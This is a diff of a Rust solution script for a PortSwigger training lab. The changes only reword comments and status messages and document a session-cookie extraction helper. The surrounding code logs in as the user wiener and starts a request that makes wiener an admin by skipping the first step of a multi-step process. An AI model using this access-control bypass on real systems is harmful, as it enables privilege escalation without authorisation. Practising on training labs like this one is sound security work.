@@ -7,7 +7,7 @@
 * PortSwigger LAB: Multi-step process with no access control on one step
 *
 * Steps: 1. Login as wiener
-*        2. Upgrade wiener to be an admin bypassing first step
+*        2. Upgrade wiener to be an admin bypassing the first step
 *
 **************************************************************************/
 #![allow(unused)]
@@ -51,10 +51,10 @@ fn main() {
     let session = extract_session_cookie(login.headers())
         .expect(&format!("{}", "[!] Failed to extract session cookie".red()));
 
-    // Upgrade wiener to be an admin bypassing first step
+    // Upgrade wiener to be an admin bypassing the first step
     print!(
         "{} ",
-        "2. Upgrading wiener to be an admin bypassing first step..".white()
+        "2. Upgrading wiener to be an admin bypassing the first step..".white()
     );
     io::stdout().flush();
     let upgrade_wiener = client
@@ -93,6 +93,9 @@ fn build_client() -> Client {
         .unwrap()
 }
 
+/**********************************************************
+* Function to extract session field from the cookie header
+***********************************************************/
 fn extract_session_cookie(headers: &HeaderMap) -> Option<String> {
     let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
     if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
